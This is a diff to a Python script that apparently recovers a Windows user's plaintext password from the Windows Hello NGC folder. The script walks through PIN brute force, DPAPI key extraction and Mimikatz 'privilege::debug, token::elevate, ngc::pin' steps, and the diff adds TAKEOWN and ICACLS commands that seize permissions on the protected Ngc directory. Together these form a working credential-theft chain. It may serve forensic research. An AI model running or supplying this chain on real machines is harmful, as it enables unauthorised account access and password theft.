@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 #
-# Copyright 2020, Tijl "Photubias" Deneut <tijl.deneut@howest.be>
+# Copyright 2021, Tijl "Photubias" Deneut <tijl.deneut@howest.be>
 
 
 import optparse, os, sys, time
@@ -28,7 +28,7 @@ def parseProtectors(sPath, boolVerbose = False):
             with open(os.path.join(sPath, protector, '2.dat'), 'rb') as f: arrProtector.append(f.read().decode('utf16').strip('\x00'))
         except:
             arrProtector.append('')
-            print('[-] Protector "' + protector + '" is probably being stored in the TPM chip.')
+            print('[-] Protector "' + protector + '" is being stored in the TPM chip.')
         with open(os.path.join(sPath, protector, '9.dat'), 'rb') as f: arrProtector.append(parseTimestamp(f.read()))
         with open(os.path.join(sPath, protector, '15.dat'), 'rb') as f: arrProtector.append(f.read())
         arrProtectors.append(arrProtector)
@@ -134,7 +134,13 @@ if __name__ == '__main__':
     check_parameters(options, args)
 
     print('[!] Parsing the Ngc folder')
-    arrGUIDs = os.listdir(args[0])
+    try:
+        arrGUIDs = os.listdir(args[0])
+    except:
+        print(r'[-] Failed, are you running as SYSTEM? (not Admin)')
+        print(r'     Alternatively, as admin, change folder permissions:')
+        print(r'     TAKEOWN /f %windir%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc /r /D Y >nul 2>&1')
+        exit(r'     ICACLS %windir%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc /grant "%username%":(F) /t >nul 2>&1')
     for sGUID in arrGUIDs:
         print('[+] NGC GUID      : ' + sGUID)
         #os.path.join(args[0], sGUID, 'Protectors')
@@ -143,7 +149,7 @@ if __name__ == '__main__':
         try: 
             with open(os.path.join(args[0], sGUID, '7.dat'), 'rb') as f: sMainProvider = f.read().decode('utf16')
         except: 
-            exit('[-] Failed, are you running as System? (not Admin)')
+            exit('[-] Failed, are you running as SYSTEM? (not Admin)')
         print('[+] Main Provider : ' + sMainProvider)
 
         print('\n== Protectors ==')
@@ -163,25 +169,32 @@ if __name__ == '__main__':
     print('[+] Got InputData: ' + bInputData.hex())
     for arrItem in arrItems:
         if arrItem[1] == '//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F': sGUID2 = arrItem[3]
-    
+
+    ## Step-by-step starts here
     print('-' * 50)
-    print('[!] It could end here, but let\'s calculate the NGC key')
-    print('     For this, run DPAPI ngccryptokeys with this GUID and Windows Hello PIN (or use PIN brute) : ' + sGUID1)
-    print('     In case of TPM usage, just press Enter')
-    sRSAKEY = input('[?] Please copy paste the private key (starts with "52534132") : ')
+    print('[!] It could end here, but let\'s calculate the first NGC key')
     from Crypto.Cipher import PKCS1_v1_5
-    if not sRSAKEY == '':
+    if not boolTPM:
+        print('     For this, run DPAPI ngccryptokeys with this GUID and Windows Hello PIN (or use PIN brute) : ' + sGUID1)
+        ## In case of using the PowerShell shortcut:
+        #print('GUID :         ' + sGUID1)
+        #print('pbInput :      ' + bInputData.hex())
+        #print('sSMARTCARDPIN: ' + '<derived from the PIN>')
+        sRSAKEY = input('[?] Please copy paste the private key (starts with "52534132") : ')
         oRSAKEY = constructRSAKEY(sRSAKEY)
         cipher = PKCS1_v1_5.new(oRSAKEY)
-        try: bClearText = cipher.decrypt(bInputData,b'')
+        try: bClearText = cipher.decrypt(bInputData, b'')
         except: exit('[-] Error decrypting the inputdata')
         bDecryptPin = parseDecryptPin(bClearText)
         print('[+] Got DecryptPIN : ' + bDecryptPin.hex().upper())
-    else: 
-        print('[!] For TPM, currently, use Mimikatz and run privilege::debug, token::elevate, ngc::pin /pin:1234 /guid:{FROM ABOVE}')
-        bDecryptPin = bytes.fromhex(input('[?] Please copy paste just the "DECRYPTPIN" from Mimikatz : '))
+    else:
+        print('[!] For TPM, you will need to know the PIN, since TPM brute forcing is limited to 32 attempts :-(')
+        print('     Mimikatz; privilege::debug, token::elevate, ngc::pin /pin:<THEPIN> /guid:' + sGUID1)
+        print('     Or use DecryptWithTPM.exe ' + sGUID1 + ' <THEPIN>')
+        bDecryptPin = bytes.fromhex(input('[?] Please copy paste just the "DECRYPTPIN" : '))
+    
     print('-' * 50)
-    print('[!] OK, run DPAPI ngccryptokeys again with GUID ' + sGUID2 + ' and PIN ' + bDecryptPin.hex())
+    print('[!] OK, now run DPAPI ngccryptokeys (again) with GUID ' + sGUID2 + ' and PIN ' + bDecryptPin.hex())
     sRSAKEY = input('[?] Please copy paste the private key (starts with "52534132") : ')
     oRSAKEY = constructRSAKEY(sRSAKEY)
     cipher = PKCS1_v1_5.new(oRSAKEY)
@@ -198,6 +211,5 @@ if __name__ == '__main__':
     from Crypto.Cipher import AES
     oCipher = AES.new(bClearText, AES.MODE_CBC, bIV)
     bResult = oCipher.decrypt(bEncPassword)
-    print('[+] !! RESULT !! ')
+    print('[+] User password : ')
     print('  ' + bResult.decode('UTF-16LE').split('\x00')[0])
-    
